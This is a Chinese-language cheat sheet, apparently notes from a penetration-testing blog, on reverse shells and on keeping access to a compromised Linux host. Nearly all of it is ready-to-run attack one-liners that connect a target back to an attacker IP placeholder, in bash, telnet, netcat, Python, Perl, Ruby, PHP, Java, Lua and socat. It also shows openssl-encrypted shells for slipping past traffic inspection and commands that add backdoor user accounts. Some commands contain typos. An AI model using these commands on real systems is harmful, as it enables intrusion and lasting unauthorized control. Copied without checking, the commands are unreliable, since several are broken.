
## 一、反弹shell方法

### 1. bash反弹

攻击机执行监听：

```bash
nc -lvvp port
```

目标执行：

```bash
bash -i >& /dev/tcp/x.x.x.x/port 0>&1
```

或者

```bash
bash -i 5<>/dev/tcp/host/port 0>&5 1>&5
```

- `bash -i`：打开一个交互的bash
- `>& /dev/tcp/x.x.x.x/port`：调用socket建立链接，x.x.x.x为要接收shell的主机ip，port为端口，将标准错误和标准输出重定向到socket连接文件。
- `0>&1`：标准输入重定向到标准输出，此时标准输出指向socket连接，从而实现了与反弹shell的交互。

第二种则是将标准输入、输出和错误均重定向到socket连接文件。

**备注：Linux不同发行版之间存在差异，某些命令可能并不适用，可自行调整。**

### 2. telnet反弹

第一种：

攻击机开2个终端，分别执行监听：

```bash
nc -lv port1
```

和

```bash
nv -lv port2
```

目标主机执行：

```bash
telent x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2
```

监听2个端口分别用来输入和输出，其中`x.x.x.x`均为攻击者ip。

第二种：

攻击机监听：

```bash
nc -lv port
```

目标主机执行：

```bash
rm -f /tmp/a;mknod /tmp/a p;telnet x.x.x.x port 0</tmp/a | /bin/bash 1>tmp/a
```

其中`x.x.x.x`为攻击机ip。

### 3. nc(netcat)反弹

攻击机监听：

```bash
nc -lv port
```

目标执行：

```bash
nc -e /bin/bash x.x.x.x port
```

如果目标上没有`-e`参数可以使用以下命令：

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>$1 | nc x.x.x.x port >/tmp/f
```

`mkfifo`的作用是创建FIFO特殊文件，也称为命名管道。FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行读写操作，本质上就是在读写内核通道，这样就可以实现进程间通信。

此外，也可以使用`telnet`的监听2个端口的方式：

```bash
nc x.x.x.x port1 | /bin/bash | nc x.x.x.x port2
```

### 4. 常见脚本反弹

下述脚本均需要现在攻击机上开启监听：`nc -lv port`，将脚本中`ip`替换为对应的攻击机IP，`port`替换为实际使用的端口。

#### 1. Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

#### 2. Perl

**1. 第一种：**

```bash
perl -e 'use Socket;$i="x.x.x.x";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**2. 第二种：**

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

#### 3. Ruby

**1. 第一种：**

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**2. 第二种：**

```bash
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### 4. PHP

```bash
php -r '$sock=fsockopen("x.x.x.x",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

#### 5. Java

```java
public class Revs {
    /**
     * @param args
     * @throws Exception
     */
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]={"/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/port;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

#### 6. Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','port');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### 5. 其他方法

#### 1. socat

攻击机监听：

```bash
socat file:`tty,raw,echo=0 tcp-listen:port
```

上传`socat`到目标主机，然后执行：

```bash
socat exec:'bash -li',pty,stderr,setid,sigint,sane tcp x.x.x.x:port
```

#### 2. 只有80和443端口且反弹shell流量被拦截

方法论：加密流程，绕过拦截

Step 1：VPS上生成SSL证书的公钥/私钥对

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

Step 2：VPN监听反弹shell

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

Step 3：连接

```bash
mkfifo /tmp/v4ler1an;/bin/bash -i </tmp/v4ler1an 2>&1 |openssl s_client -quiet -connect x.x.x.x:443 >/tmp/v4ler1an
```

此时的shell存在缺陷（无法命令补全等），通过以下方法修复：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

`pty`是一个伪终端模块。`pty.spawn(argv[, master_read[, stdin_read]])`产生一个进程，并将其控制终端与当前进程的标准输入输出连接。这通常用于阻挡坚持从控制终端读取的程序。向函数`master_read`和`stdin_read`传递了文件描述符，它们应从中读取，并且它们应始终返回字节字符串。两个函数的默认实现在每次函数被调用时将读取并返回至多 1024 个字节。会向`master_read`回调传入伪终端的主文件描述符以从子进程读取输出，而向`stdin_read`传入文件描述符 0 以从父进程的标准输入读取数据。

在 3.4 版更改: `spawn()` 现在从子进程的 `os.waitpid()` 返回状态值

## 二、权限维持方法

### 1. 一句话添加用户和密码

添加普通用户：

```bash
# 创建一个用户名guest，密码为123456的普通用户
useradd -p `openssl passwd -1 -salt 'salt' 123456` guest
# useradd -p 方法 `` 是用来存放可执行的系统命令。“$()”也可以存放命令执行语句。
useradd -p "$(openssl passwd -1 123456)" guest
# chpasswd方法
useradd guest;echo 'guest:123456'|chpasswd
# echo -e方法
useradd guest;echo -e "123456\n123456\n"|passwd guest
```

添加root用户：
